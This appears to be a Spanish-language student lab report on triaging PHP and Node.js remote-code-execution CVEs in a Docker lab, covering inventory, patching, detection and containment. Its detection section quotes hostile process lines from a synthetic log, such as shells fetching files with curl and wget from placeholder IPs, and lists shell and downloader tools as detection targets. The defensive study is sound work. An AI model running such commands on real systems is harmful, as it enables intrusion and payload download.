# Entregable — TP PHP2Shell / Node2Shell

**Grupo:** 04 · **Fork del grupo:** https://github.com/LoLoo03/goys-2026-tp-vulnerabilidades · **Rama:** `grupo-04`
**Fecha del taller:** jueves 29/10/2026 · **Revisión documental local:** 01/11/2026

| Integrante | Usuario de GitHub | Rol en el TP |
|---|---|---|
| Lorenzo Bellomo | LoLoo03 | Inventario, cambios/parche, detección, contención/comunicación |
| Agustin Ignacio Kloster | AgusKlos | Revisión de `entrega.md` y `deteccion.md`, preparación del comité |

> El taller en el aula (29/10) lo ejecutó un solo integrante, Lorenzo Bellomo; por eso
> concentra los cuatro roles, y su `informe.md` lo refleja. La revisión posterior
> (30/10), a cargo de Agustin Ignacio Kloster, se hizo sobre el código del laboratorio,
> `audit.log` y las capturas, **sin volver a levantar el laboratorio**: lo que agrega
> esa revisión es análisis, no evidencia nueva de ejecución.
> Las horas están en UTC (reloj de Docker); en Argentina son UTC−3.

---

## Alcance de esta revisión

Esta propuesta conserva los aportes identificados de Lorenzo Bellomo y Agustin
Ignacio Kloster. No incorpora nuevas pruebas de laboratorio ni acredita la
participación de otro integrante. Se revisaron los documentos y las evidencias
publicadas en la rama `grupo-04`, commit
`0ba3296bc49d887d2575ba7863c49c041f705f26`. Las decisiones propuestas se actualizan
con el [contexto de la cátedra al 29/10](https://github.com/rodriguezemautn/goys-2026-tp-vulnerabilidades/blob/23cbf681a31ef661d5de3e0a48bee09bf929f718/recursos/contexto.md),
revisión `23cbf681a31ef661d5de3e0a48bee09bf929f718`: se conserva la evidencia
histórica del taller y no se presenta esta actualización como nueva ejecución.

Se distinguen tres planos: **capturas del laboratorio**, **eventos del log sintético**
y **decisiones propuestas para una organización ficticia**. Los hosts del log no
son evidencia de intrusión en los contenedores ejecutados por el grupo. Las versiones
destino y la cronología describen el taller de octubre, no una recomendación permanente
para cualquier instalación futura.

## 1. Inventario

Evidencia: [`capturas/01-inventario-antes.txt`](capturas/01-inventario-antes.txt)
(`docker compose ps` + `./scripts/inventario.sh`, 2026-10-29T22:47:09Z) y
[`capturas/02-detectar.txt`](capturas/02-detectar.txt) (árbol de procesos).

| Activo | Versión | ¿Expuesto a Internet? | ¿Procesa contenido no confiable? | ¿Afectado? | Evidencia |
|--------|---------|:---------------------:|:--------------------------------:|:----------:|-----------|
| Portal PHP (`php-lab`, web01) | PHP 8.3.35, Apache + mod_php | No en el lab / Sí en el despliegue supuesto | Sí: formulario con sesiones y subida de archivos | **Sí** (PHP2Shell, CVE-2026-109618/109619; corregido en 8.3.36) | `PHP 8.3.35 (cli)`; `session.upload_progress.enabled=1`; imagen `php:8.3.35-apache`; `docker top` muestra `apache2 -DFOREGROUND` (master root + workers www-data), sin `php-fpm` |
| API Node.js (`node-lab`, api01) | Node v22.23.3, brotli 1.1.0 (del runtime), Express 5 | No en el lab / Sí en el despliegue supuesto | Sí: `POST /decode` recibe cuerpos `Content-Encoding: br` de clientes; el decoder corre en body-parser (`express.raw`) antes del handler | **Sí** (Node2Shell, CVE-2026-111497; corregido en 22.23.4) | `v22.23.3 / brotli 1.1.0`; `npm ls` sin paquete brotli externo: el decoder lo aporta el runtime |
| Servicio Python (`py-lab`, svc01) | Python 3.11.18, brotli 1.0.9 (PyPI) | No | Parcial: decodifica `br` de lo que le llega por la red interna | **Sí** (CVE-2026-111497; brotli 1.0.3–1.2.0 afectado, corregido en 1.0.10 / 1.1.1 / 1.2.1) | `brotli 1.0.9` |

**SAPI de PHP.** `inventario.sh` corre `php -v` por CLI, así que muestra `(cli)`. El
SAPI web se deduce de la imagen `-apache` y del árbol de procesos: solo hay
`apache2`, sin `php-fpm`, por lo tanto PHP corre como módulo de Apache (mod_php), el
caso de **mayor riesgo** según el aviso: el ataque ocurre antes de que corra la app.
No imprimimos el SAPI web directamente (la página `index.php` lo muestra, pero no hay
puertos publicados y la guía no incluye un comando para pedirla). En la sección 3
dejamos el comando que lo haría, sin ejecutar.

**Brotli en Node: el string no alcanza como evidencia.** El runtime informa brotli
1.1.0 en la versión vulnerable y sigue informando 1.1.0 en la corregida
(ver sección 3). La señal válida es la versión de Node (22.23.4), no el string.

**Dónde se decodifica Brotli en la API.** `server.js` usa `express.raw()` en
`POST /decode`. En Express 5, `express.raw` es body-parser 2, que por defecto
(`inflate: true`) **ya descomprime** los cuerpos con `Content-Encoding: br` antes de
que corra el handler (`recursos/contexto.md`, "Cómo llega al decoder"). Esto sale de
leer el código y la documentación; no se probó en el laboratorio. Consecuencias:

- El decoder vulnerable se alcanza en body-parser aunque el handler no hiciera nada
  con Brotli. Sacar `brotliDecompressSync` del handler no saca a la API del alcance.
- El handler vuelve a decodificar un cuerpo que ya llega descomprimido, así que un
  `POST /decode` legítimo con `br` probablemente responda `400 brotli invalido`. Es
  un bug funcional, ajeno al CVE, que solo aparecería con una prueba funcional con
  un cuerpo Brotli benigno (ver "Qué no se pudo probar").

**Supuestos de exposición:**

- En el laboratorio ningún servicio está expuesto: no hay `ports:` publicados y la red
  `labnet` es `internal: true` (verificado en sección 5).
- En el despliegue real que simula el lab suponemos que el **portal PHP** está
  publicado a Internet (es un portal de legajos con subida de archivos) y que la
  **API Node** recibe cuerpos de clientes externos detrás de un proxy que **no**
  descomprime ni filtra `Content-Encoding: br`. El **servicio Python** es interno y
  solo recibe tráfico de otros servicios.
- Si el proxy descomprimiera Brotli, el proxy pasaría a ser el activo afectado
  (Envoy/Istio están en la lista del aviso) y habría que inventariarlo.
- El log de la sección 4 menciona un host **db01** que no está en este inventario:
  es un activo sin relevar.

**Ajuste de entorno (declarado):** el equipo donde corre el laboratorio tiene
Kaspersky Endpoint Security, que intercepta HTTPS y re-firma los certificados con su
propia CA (*Kaspersky Endpoint Security Personal Certification Authority*). Windows
confía en esa CA, pero los contenedores no, así que `./scripts/arrancar-2h.sh`
falló al construir la imagen de Node (`npm install` → `SELF_SIGNED_CERT_IN_CHAIN`).
Cambiar de red no lo resolvió, porque la intercepción ocurre en el propio equipo.
Las imágenes `goys-vuln-lab-node` se construyeron con una copia del `Dockerfile` de
la cátedra que solo agrega esa CA durante `npm install` (ver sección 3). No se
modificó `docker-compose.yml`, el código del laboratorio, `docs/` ni `recursos/`.
Las imágenes de PHP y Python se obtuvieron sin cambios.

---

## 2. Priorización y decisión

| Activo | CVSS | Explotación real | Exposición | Criticidad | Decisión y plazo |
|--------|:----:|:----------------:|:----------:|:----------:|------------------|
| Portal PHP | 9.2 (CVSS 4.0) | **Sí**: confirmada, en CISA KEV desde 26/10 | Alta (supuesto: publicado, mod_php) | Alta: datos de legajos de personal | **1.º — Ya.** Mitigación inmediata (`upload_progress = 0`) y parche a 8.3.36 en ventana de emergencia, **< 24 h** |
| API Node.js | 9.2 (Google, CNA) / High (Node.js) | **Sí**, según el contexto actualizado de la cátedra: KEV desde 27/10; no demuestra compromiso de api01 | Alta (supuesto: recibe `br` de clientes; Express 5 descomprime) | Media-alta | **Emergencia — < 24 h.** Actualizar a 22.23.4; mientras tanto, evaluar rechazo de `br` antes del decoder y comprobar su efectividad |
| Servicio Python | 9.2 (mismo CVE) | **Sí** para el CVE según la cátedra; el log no confirma ese vector en svc01 | Interna por diseño; el escenario sintético muestra comandos sospechosos | Media | **Emergencia — < 24 h en este escenario.** Actualizar brotli (1.0.10 o 1.2.1) y validar compatibilidad; contención inmediata ante señales corroboradas |

**Justificación actualizada:** PHP sigue primero por datos personales, exposición
supuesta y criticidad. Node2Shell ya reúne la condición que antes habría disparado
la emergencia: el contexto de la cátedra informa explotación y KEV desde el 27/10.
La API no mantiene por tanto una ventana ordinaria de 72 horas. Python comparte
el componente afectado y presenta señales sospechosas en el escenario; también se
propone actualizarlo dentro de 24 horas, sin esperar para contener.

Los tres comparten plazo urgente, pero no tareas idénticas: dueños del portal, API
y servicio interno validan sus respectivas operaciones. El rechazo de Brotli es
una compensación propuesta, no un control desplegado ni una razón para posponer
sin pruebas. Los datos de explotación se atribuyen al contexto actualizado; los
eventos del log no identifican por sí solos un CVE.

**Qué evidencia cambiaría el orden:**

- Compromiso real corroborado, acceso a datos o movimiento lateral en cualquier
  activo: respuesta al incidente inmediata, por delante del orden de parcheo.
- Exposición diferente del supuesto, o un proxy que descomprima `br`: revisar qué
  componente recibe el contenido y ampliar el inventario antes de afirmar cobertura.
- Evidencia de aplicabilidad de Fragnesia en el kernel Linux del entorno Docker:
  incorporar el tratamiento del host, no limitar el cierre a las imágenes de aplicación.

**Esta señal aparece en el escenario sintético.** [`deteccion.md`](deteccion.md)
identifica comandos anómalos en web01, api01 **y svc01** (27/10, 09:42–09:45 UTC).
La matriz anterior ordena el tratamiento de vulnerabilidades. Ante registros
reales equivalentes, autentificados y sin explicación autorizada, se activaría
además la respuesta a incidentes; no se esperaría al plazo de parcheo:

| Paso | Activo | Acción | Plazo |
|---|---|---|---|
| 0 | web01, api01, svc01 | Tratar como incidente: aislar de la red, preservar evidencia (memoria, disco, logs) y rotar los secretos accesibles desde esos servicios | Inmediato, antes de parchear |
| 0 | db01 | Identificar las sesiones SSH de 09:42–09:49 (usuario, origen, método). Si no se explican, se suma al incidente | Inmediato |
| 1–3 | Los tres | Parchear según la matriz, **reconstruyendo desde imágenes limpias** y no sobre el contenedor comprometido | Plazos de la matriz |

- Parchear un servicio comprometido cierra la entrada, pero no saca al atacante.
  Por eso el aislamiento va primero.
- **svc01 comparte la ventana de emergencia.** Su ubicación interna no elimina el
  riesgo: el `uname -a` sintético justifica investigación, no demuestra movimiento
  lateral. La actualización propuesta pasa a **< 24 h**, como la API; no se atribuye
  esta decisión a un nuevo resultado del laboratorio.
- El log no permite atribuir el acceso a uno u otro CVE. La explotación descrita por
  la cátedra modifica la prioridad preventiva, no la certeza de compromiso por host.

En el laboratorio, como el costo era bajo y no hay usuarios reales, aplicamos los tres
parches en la misma sesión; el orden de arriba es el que aplicaríamos en producción.

---

## 3. Mitigación, parche y reversión

| Fecha/hora (UTC) | Activo | Cambio | Antes | Después | Reversión |
|------------|--------|--------|-------|---------|-----------|
| 29/10/2026, antes del taller | Entorno (build de API Node.js) | Build de `goys-vuln-lab-node:22.23.3-bookworm-slim` y `:22.23.4-bookworm-slim` con un `Dockerfile` temporal que confía en la CA de Kaspersky (comando abajo) | `npm install` fallaba con `SELF_SIGNED_CERT_IN_CHAIN`; el lab no arrancaba | `./scripts/arrancar-2h.sh`: `php-lab`, `node-lab` y `py-lab` en `healthy`; inventario: PHP 8.3.35, Node v22.23.3 / brotli 1.1.0, Python brotli 1.0.9 | `docker rmi goys-vuln-lab-node:22.23.3-bookworm-slim goys-vuln-lab-node:22.23.4-bookworm-slim` y reconstruir con `docker compose --env-file versions.env build` en un equipo sin intercepción HTTPS |
| 2026-10-29 22:47:58Z | Portal PHP | **Mitigación:** `laboratorio/php/php.ini`: `session.upload_progress.enabled = 1` → `0`; `docker compose restart php-lab` | `session.upload_progress.enabled=1` | `session.upload_progress.enabled=0`; `php-lab` `healthy` a los 8 s ([`04-mitigacion-php.txt`](capturas/04-mitigacion-php.txt)) | Restaurar `1` y reiniciar solo en una reversión autorizada y aislada; no retirar esta mitigación mientras el riesgo siga abierto |
| 2026-10-29 22:48:26Z | Los tres | **Intento de parche** con `./scripts/parchear.sh` | Versiones vulnerables | **Falló** el rebuild de Node por la intercepción de Kaspersky (`SELF_SIGNED_CERT_IN_CHAIN`); no se recreó ningún contenedor ([`05-parchear-intento.txt`](capturas/05-parchear-intento.txt)) | No aplica: no cambió nada |
| 2026-10-29 22:53:11Z | Los tres | **Parche** con las mismas variables que `parchear.sh`, sin reconstruir Node (comando abajo) | PHP 8.3.35, Node v22.23.3, brotli (Py) 1.0.9 | PHP **8.3.36**, Node **v22.23.4**, brotli (Py) **1.2.1**; los 3 `healthy`; la mitigación de PHP sigue en `0` ([`06-parche-despues.txt`](capturas/06-parche-despues.txt)) | `docker compose --env-file versions.env up -d --wait`: `versions.env` vuelve a las versiones anteriores, cuyas imágenes siguen en el equipo. Mantener `upload_progress = 0` y el aislamiento; no devolver versiones vulnerables al tráfico externo |

**Parche aplicado (equivalente a `parchear.sh`).** `parchear.sh` exporta
`PHP_TAG=8.3.36-apache`, `NODE_TAG=22.23.4-bookworm-slim` y `BROTLI_VERSION=1.2.1` y
corre `docker compose --env-file versions.env up -d --build`. El `--build` vuelve a
construir Node con el `Dockerfile` original, que falla en este equipo. Se usaron las
mismas variables, se construyó solo Python y se levantó sin `--build`, usando la
imagen de Node 22.23.4 ya construida con el ajuste de Kaspersky:

```bash
export PHP_TAG=8.3.36-apache NODE_TAG=22.23.4-bookworm-slim BROTLI_VERSION=1.2.1
docker compose --env-file versions.env build py-lab
docker compose --env-file versions.env up -d --wait
./scripts/inventario.sh
```

**Condiciones para revertir.** La reversión anterior reproduce el estado del taller,
no garantiza un estado seguro. Si una actualización rompe una operación crítica,
el responsable del servicio y seguridad deben registrar el motivo, preservar la
evidencia y decidir entre mantener el servicio suspendido o recuperar una imagen
limpia conocida bajo aislamiento y controles compensatorios. Una imagen anterior
sospechada de compromiso no es un respaldo confiable. No restaurar secretos expuestos
ni reabrir tráfico únicamente porque el healthcheck pase. Validar la operación que
falló y fijar responsable y vencimiento del riesgo residual. No se ensayó esta
reversión en la presente revisión.

**Límite de la mitigación PHP.** Desactivar `session.upload_progress.enabled` reduce
rutas concretas, pero no reemplaza el parche ni cubre todas las variantes. No se
presenta como protección completa frente a ambos CVE. Fuente:
[aviso oficial PHP del 21/10](https://www.php.net/archive/2026.php#2026-10-21-5).

**Ventana de cambio.** En el lab, el corte fue de unos segundos por servicio
(recreación de contenedores). En producción, PHP va en ventana de emergencia el mismo
día; API y Python también pasan a ventana de emergencia **< 24 h** por el contexto
actualizado y las señales del escenario (§2). Son plazos propuestos para producción,
no nuevos tiempos medidos ni nuevas pruebas del taller.

**Versión destino de brotli en Python.** El aviso corrige en 1.0.10, 1.1.1 y 1.2.1.
`parchear.sh` sube de 1.0.9 a 1.2.1, que es un salto de rama. En producción, el
cambio mínimo y de menor riesgo de compatibilidad sería 1.0.10, dentro de la misma
rama 1.0.x. En el lab se usó 1.2.1 porque es lo que define la cátedra.

**Detalle del ajuste de entorno (Kaspersky).** La CA se exportó del almacén de
certificados raíz de Windows a un archivo PEM (`kaspersky-ca.crt`) fuera del repo.
No se commitea: es específica de este equipo. El `Dockerfile` temporal, también fuera
del repo, es el de `laboratorio/node/Dockerfile` con una sola diferencia en el paso
de `npm install`:

```dockerfile
ARG NODE_TAG=22.23.3-bookworm-slim
FROM node:${NODE_TAG}

WORKDIR /app

COPY package.json ./
COPY --from=ca kaspersky-ca.crt /tmp/kaspersky-ca.crt
RUN NODE_EXTRA_CA_CERTS=/tmp/kaspersky-ca.crt npm install --omit=dev && rm /tmp/kaspersky-ca.crt

COPY server.js ./

USER node
EXPOSE 3000
CMD ["node", "server.js"]
```

Comando, desde `laboratorio/`, una vez por versión (`22.23.3-bookworm-slim` y
`22.23.4-bookworm-slim`):

```bash
docker buildx build --load -f <dir-temporal>/Dockerfile.kaspersky \
  --build-context ca=<dir-temporal> \
  --build-arg NODE_TAG=<version> \
  -t goys-vuln-lab-node:<version> ./node
```

La verificación TLS no se desactivó: npm sigue validando el certificado, pero contra
la CA de Kaspersky. La CA se borra de la imagen al terminar la instalación.

**Prueba funcional mínima:** después de la mitigación y después del parche, los tres
servicios pasaron su healthcheck (`docker compose ps` → `healthy`). El alcance de esa
prueba no es el mismo en los tres:

- Node: `fetch('http://127.0.0.1:3000/')` y exige respuesta `ok`. Ejecuta la ruta `/`
  de Express: prueba la app.
- Python: `urlopen('http://127.0.0.1:8000/')`. Ejecuta `do_GET`, que consulta el
  módulo `brotli`: prueba la app.
- PHP: `php -r` con `fsockopen('127.0.0.1', 80)`. Solo comprueba que Apache **acepta
  conexiones TCP**, y lo hace desde el PHP de **CLI**. No prueba que mod_php
  interprete `index.php`: un Apache con el módulo PHP roto pasaría igual.

En PHP, entonces, la prueba funcional es más débil que en los otros dos. Este comando
la cerraría sin publicar puertos ni salir de la red, porque pide la página por
loopback dentro del mismo contenedor. **No se ejecutó**: se identificó en la revisión
del 30/10, con el laboratorio ya apagado.

```bash
docker compose exec -T php-lab php -r 'echo file_get_contents("http://127.0.0.1/");' \
  | grep -A1 -E 'PHP:|SAPI:|upload_progress'
```

Resultado esperado: `8.3.36`, `apache2handler` y `upload_progress.enabled` en `0`.
Además confirmaría el SAPI web, que en la sección 1 se dedujo del árbol de procesos.

**Qué no se pudo probar:**

- Que la mitigación y el parche **cierren** la vulnerabilidad: no se ejecutan PoCs.
  Lo verificado es la versión y la configuración, que es lo que indica el aviso.
- El formulario de subida de PHP y `POST /decode` con un cuerpo Brotli benigno: la
  guía no trae un comando para eso y los servicios no publican puertos. El healthcheck
  solo prueba la ruta `/`.
- Que la mitigación de PHP no rompa una funcionalidad: la app del lab no usa la barra
  de progreso de subida; en una app real habría que revisarlo.
- Que las imágenes de Node construidas con el `Dockerfile` de la cátedra, sin el
  ajuste de Kaspersky, se comporten igual. En este equipo ese build falla. La
  diferencia esperada es nula: el ajuste solo cambia en qué CA confía npm al bajar
  `express`.

---

## 4. Detección y caza

Resumen; el análisis completo está en [`deteccion.md`](deteccion.md). Evidencia:
[`capturas/02-detectar.txt`](capturas/02-detectar.txt).

**Hipótesis:** si PHP2Shell o Node2Shell se explotaron, en web01, api01 o svc01 vamos
a ver al proceso del servicio (`apache2`, `node`, `python`) lanzando un shell o un
descargador (`sh`, `bash`, `curl`, `wget`, `nc`) a partir del 17/10 según la cronología del escenario, con comandos de
reconocimiento (`id`, `uname`) o URLs a IPs externas.

**Hallazgos en `audit.log`:**

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|-------------------|------|--------------|:---------:|---------|
| 2026-10-27T09:42:17Z / :18Z | web01 | `apache2` → `sh -c id` → `id` | **Sí** | Shell de reconocimiento inesperado; el evento no acredita UID, autorización ni CVE concreto |
| 2026-10-27T09:43:03Z / :04Z | api01 | `node` → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | La API no usa `child_process`; intento de descarga con resultado desconocido |
| 2026-10-27T09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | **Sí** | Otro intento de descarga desde web01, a una IP del rango de documentación |
| 2026-10-27T09:45:10Z / :11Z | svc01 | `python` → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento en el servicio **interno**: posible movimiento lateral |
| 09:42:40Z, 09:44:10Z, 09:49:00Z | db01 | `sshd` → `-bash` | Indeterminado | Puede ser una sesión administrativa; coincide con la ventana del ataque y db01 no está inventariado |
| 09:45:00Z, 09:47:00Z / 09:43:40Z | api01 / svc01 | `node` → `node server.js` / `python` → `python app.py` | Baja, a confirmar | Mismo binario y argumentos del servicio: compatible con un reinicio o supervisor. Pero rodean a los hallazgos de api01 y svc01 y podrían ser intentos fallidos que tiraron el proceso (`deteccion.md` §2.2) |

**¿Hay compromiso?** En el escenario sintético hay señales suficientes para tratar
web01, api01 y svc01 como un incidente presunto. El log registra creación de procesos
anómalos, no confirma el vector, la autorización ni el resultado de las descargas.
No demuestra compromiso de los contenedores del taller. La secuencia orienta la
investigación, pero no prueba automatización ni un mismo atacante. El alcance y
las sesiones de db01 requieren evidencia adicional.

**Regla propuesta para Node.js:** alertar en api01 cuando el padre directo sea
`node` y el hijo esté en la lista de `deteccion.md` §4. El contraste documental
selecciona la línea 9; no demuestra una alerta desplegada. La lista incluye
`python`; los binarios no listados, la ejecución en memoria y los intermediarios
pueden quedar fuera. La contención se decide con contexto, no se afirma aislamiento
automático por una coincidencia del archivo.

**Limitaciones del log:** no trae usuario/UID ni IP de origen de la conexión, ni
resultado del comando; cubre solo 9 minutos del 27/10 (nada desde el 17/10, cuando
empezaron los intentos); no hay telemetría de red para ver si la salida a
`198.51.100.x` funcionó.

**Árbol de procesos capturado al cierre del taller:** sin hijos sospechosos. En `node-lab` aparece
`node -e fetch(...)`, pero es el healthcheck de Docker: su padre es el runtime del
contenedor, no `node server.js`, así que la regla no lo dispara
([`07-contencion-y-procesos-despues.txt`](capturas/07-contencion-y-procesos-despues.txt)).

---

## 5. Contención

Evidencia: [`capturas/03-contencion-antes.txt`](capturas/03-contencion-antes.txt) y
[`capturas/07-contencion-y-procesos-despues.txt`](capturas/07-contencion-y-procesos-despues.txt)
(`./scripts/verificar-contencion.sh`, `docker compose config`, `./scripts/detectar.sh`).

| Control | Configuración | Evidencia | ¿Funciona? | Qué daño evita |
|---------|---------------|-----------|:----------:|----------------|
| Red sin salida | `networks.labnet.internal: true`, sin `ports:` | `SIN SALIDA` en PHP, Node (`TypeError`) y Python (`URLError`), antes y después del parche | Configurado; pruebas de salida sin respuesta exitosa | Busca limitar descargas, exfiltración y comunicación externa; las pruebas no acreditan bloqueo de todo destino o protocolo |
| Usuario sin privilegios | `user: node` (Node), `user: nobody` (Python); Apache: master `root`, workers `www-data` | `docker top`: `node` con UID 1000, `python` como `nobody`, workers `apache2` como `www-data` | **Sí** (Node, Python) / Parcial (PHP) | Reduce privilegios, pero un RCE aún puede acceder a datos y credenciales legibles por la cuenta del servicio. En PHP el master sigue siendo root |
| Filesystem read-only | `read_only: true` + `tmpfs` solo en `/tmp` (y rutas de Apache) | `read_only: true` en los 3 servicios en `docker compose config`; código de PHP montado `:ro` | **Sí** (declarado) | Reduce escrituras en la raíz de solo lectura; no impide ejecución en memoria ni abuso de rutas escribibles o servicios externos. `tmpfs` no persiste al recrear el contenedor |
| Capabilities mínimas | `cap_drop: ALL`; PHP recupera solo `CHOWN`, `SETUID`, `SETGID`, `DAC_OVERRIDE`, `NET_BIND_SERVICE`; `no-new-privileges:true` | `docker compose config` | **Sí** (declarado) | Sin capacidades de red cruda, montaje ni administración; `no-new-privileges` bloquea escalar con binarios setuid |
| Límites de memoria/PIDs | `mem_limit` 256 MB (PHP, Node) / 128 MB (Python); `pids_limit` 100 / 100 / 50 | `docker compose config` | **Sí** (declarado) | Acota minería, fork bombs y que un contenedor comprometido tumbe al host |
| Rechazo de Brotli innecesario | No configurado: `POST /decode` acepta `Content-Encoding: br` | `node/server.js`: `express.raw()` con `inflate` por defecto (`true`) | **No** | Control propuesto mientras no se parchee: rechazar `br` en el proxy, o en la app con `express.raw({ inflate: false })`, que hace que body-parser responda 415 a cuerpos comprimidos **antes** de tocar el decoder. Un filtro dentro del handler llegaría tarde. Corta el camino de entrada de Node2Shell; costo: `/decode` deja de aceptar Brotli, así que es temporal |

**Prueba de salida a Internet:** las capturas anteriores y posteriores al parche
muestran PHP `SIN SALIDA`, Node `SIN SALIDA TypeError` y Python `SIN SALIDA URLError`.
La observación es que esas solicitudes no obtuvieron respuesta exitosa; los errores
genéricos no identifican por sí solos si falló DNS, TLS, la ruta o el destino.
`internal: true` respalda la intención de aislamiento en la configuración. No se
probó cada protocolo ni se reprodujeron las URLs del log. Para atribuir un bloqueo
a la política harían falta inspección de la red efectiva y trazas del rechazo,
sin habilitar salida a Internet ni alterar la red interna del laboratorio.

**Riesgo residual y límites de lo verificado:**

- `read_only`, capabilities y límites están **verificados en la configuración**
  (`docker compose config`), no con una prueba que intente escribir o agotar memoria:
  la guía no trae ese comando.
- La red interna corta la salida, pero **no** el movimiento lateral entre los tres
  servicios dentro de `labnet` (svc01 motiva esa hipótesis; el log no demuestra la ruta usada).
- El master de Apache corre como root y PHP conserva 5 capabilities: tiene
  mayor superficie de privilegios; el log sintético no mide ataques sobre ese contenedor.

**Kernel del entorno Docker: alcance pendiente.** El contexto de la cátedra incluye
PHP2Shell + Fragnesia (CVE-2026-46300), una cadena hacia privilegios elevados. No se
relevó el kernel Linux que ejecuta los contenedores, incluida la VM del motor si
corresponde. Su aplicabilidad es **indeterminada**: no se deduce del sistema operativo
del equipo ni de las versiones PHP/Node. Infraestructura debe inventariar versión,
configuración y correcciones del proveedor durante la primera jornada, y seguridad
evaluar el host antes de cerrar el riesgo. No se ejecutan PoCs ni se supone que
este entorno esté afectado. Un usuario sin privilegios y un filesystem read-only
no demuestran resistencia a una vulnerabilidad del kernel; actualizar PHP no
corrige por sí solo ese componente. Si hay evidencia de compromiso del host, la
recuperación debe abarcarlo, no solo reconstruir contenedores.

**Control extra propuesto para producción:** segmentar los servicios y permitir
solo las comunicaciones necesarias, con reglas efectivas entre segmentos. Reduce
el movimiento lateral, sin garantizar que todo acceso interno sea legítimo.
No se propone modificar la red interna ni publicar puertos del laboratorio.

---

## 6. Conclusión (5 líneas)

1. En las primeras 2 horas, si hay señales de compromiso, aislaríamos y
   preservaríamos evidencia antes de parchear. Entre los parches, PHP va primero:
   la mitigación es un cambio de configuración y no reemplaza la actualización.
2. Inventariaríamos dependencias transitivas y proxies, no solo runtimes: Brotli llega
   por Node, Express, `fetch` y Envoy aunque nadie lo importe.
3. Usaríamos la versión del runtime como evidencia, no el string de Brotli, que no
   cambia con el parche.
4. Cazaríamos desde el 17/10 y no desde el disclose, y declararíamos db01 como activo
   sin relevar.
5. Probaríamos antes el pipeline de build: la intercepción de HTTPS en el equipo nos
   frenó el arranque y el parche, y en una emergencia eso es tiempo perdido.

---

## 7. Preparación del comité de crisis

Respuestas preparadas para las preguntas de [`docs/comite.md`](../../docs/comite.md),
apoyadas en la evidencia de las secciones anteriores.

**Mensaje de apertura (2 min).** El 21/10 se publicaron dos fallas que afectan a
nuestros tres sistemas. Una, en el portal de legajos, ya se usa para atacar
organizaciones reales. Para Node2Shell, el contexto actualizado de la cátedra también
informa explotación y KEV. En el escenario del ejercicio, el log sintético del
27/10 muestra procesos anómalos: proponemos tratarlos como incidente presunto y
validar su alcance, sin afirmar una intrusión real en el laboratorio. **Pedimos dos
decisiones:** autorización para aislar hoy los tres servicios afectados y una ventana
de emergencia para actualizar portal, API y Python en menos de 24 horas; además,
relevamiento del kernel antes de dar el riesgo por cerrado.

| # | Pregunta | Respuesta | Evidencia |
|---|---|---|---|
| 1 | ¿Parcheamos en caliente facturación sin entorno de pruebas? | No a ciegas, pero tampoco esperamos. Ahora: mitigación de una línea, reversible en segundos. El mismo día: respaldo, ventana corta, actualización y una operación de prueba (emitir una factura de prueba). La reversión requiere imagen limpia, aislamiento y aceptación del riesgo residual; no se reabre una versión vulnerable por el solo hecho de recuperar disponibilidad. Con una falla en KEV, el riesgo de no parchear es mayor | §3: mitigación y reversión de PHP; parche en segundos por servicio |
| 2 | El hosting no actualiza PHP hasta el viernes. ¿Qué compensamos? | Hasta el viernes: (a) `upload_progress = 0`; (b) restringir quién llega al portal (VPN o lista de IPs, si el uso lo permite); (c) bloquear la salida a Internet del servidor; (d) alerta por procesos hijos de `apache2`. Verificación: valor del `.ini`, prueba de salida que falla y regla contrastada documentalmente con `audit.log`, sin despliegue de alertas. El dueño del portal firma la aceptación del riesgo residual hasta el viernes | §3, §5 (`SIN SALIDA`), `deteccion.md` §4 |
| 3 | Pregunta original: «Node2Shell no se explota todavía. ¿Ventana de emergencia?» | La premisa quedó desactualizada: la cátedra informa explotación y KEV desde el 27/10. Proponemos actualizar la API en **< 24 h**, comprobar su operación y evaluar rechazo de Brotli antes del decoder mientras tanto. Python comparte plazo urgente por el componente y las señales del escenario. La contención de actividad corroborada es inmediata, sin esperar al parche | §2; contexto actualizado de la cátedra; `deteccion.md` §2 |
| 4 | ¿Qué le decimos a clientes y cuándo? | Cuando tengamos el alcance mínimo y la contención en marcha, sin esperar a cerrar la investigación. Mensaje inicial: investigamos actividad sospechosa, indicamos únicamente las medidas realmente aplicadas y fijamos la próxima actualización. No se afirma que la actividad fue contenida ni que hubo acceso a datos sin confirmación. Nunca: versiones, qué falta parchear, IPs ni vector. Como el portal guarda datos personales, legales evalúa si hay obligación de notificar según la normativa de protección de datos personales (en Argentina, Ley 25.326). Esa obligación no la verificamos nosotros | No aplica: es una decisión de legales y comunicación, no una afirmación técnica |
| 5 | Si el atacante usa un agente para post-explotación, ¿qué sigue funcionando? | Lo que no depende del perímetro: restricción de salida a Internet (reduce las comunicaciones permitidas; las capturas no prueban bloqueo universal), usuario sin privilegios (en Node, Python y los workers de Apache; **no** en el master de Apache, que corre como root: el log sintético no permite inferir el UID de ejecución real en web01), filesystem de solo lectura, `no-new-privileges` y límites de PIDs. La regla puede detectar hijos de Node de su lista, pero no ejecución en memoria ni otros falsos negativos de `deteccion.md` §4. Lo que **no** frena: el movimiento lateral dentro de la red interna (hipótesis para svc01) → segmentar en un diseño de producción; no se cambia la red del laboratorio | §5, `deteccion.md` §2.1 y §4 |
| 6 | ¿Qué nos hace pasar de "monitorear" a "apagar"? | Ejecución de comandos desde un servicio (representada en el log sintético del 27/10), conexiones salientes exitosas, acceso no explicado a db01 o señales de exfiltración. Con la primera ya corresponde **aislar**, que es lo que pedimos autorizar en la apertura. Apagar destruye la memoria, que es evidencia: preferimos cortar la red y apagar solo si aislar no alcanza | `deteccion.md` §2 |
| 7 | El CERT avisa un martes a las 9:40. ¿Qué hacemos primero? | 9:40–10:00: ¿tenemos el producto?, ¿dónde?, ¿expuesto? (inventario, incluidas las dependencias que vienen dentro de otros componentes). 10:00–11:00: mitigación reversible en lo expuesto y búsqueda en los logs **desde antes** del aviso. Antes del mediodía: dueños, ventana y mensaje interno. Un responsable por tarea | §1, §6 |
| 8 | ¿Cómo sabemos que el parche quedó y que la app funciona? | El criterio es verificar runtime (8.3.36, v22.23.4, brotli 1.2.1) y operaciones funcionales, no solo el string Brotli de Node. Las capturas históricas muestran versiones y healthchecks; las pruebas funcionales completas siguen pendientes, con la debilidad de PHP declarada. Eso no certifica el kernel ni elimina persistencia: su alcance sigue pendiente y se requiere evaluación del host antes del cierre | §3 y §5; [`capturas/06-parche-despues.txt`](capturas/06-parche-despues.txt) |

---

## 8. Checklist antes de entregar

- [x] El laboratorio arrancó y los 3 servicios quedaron `healthy`.
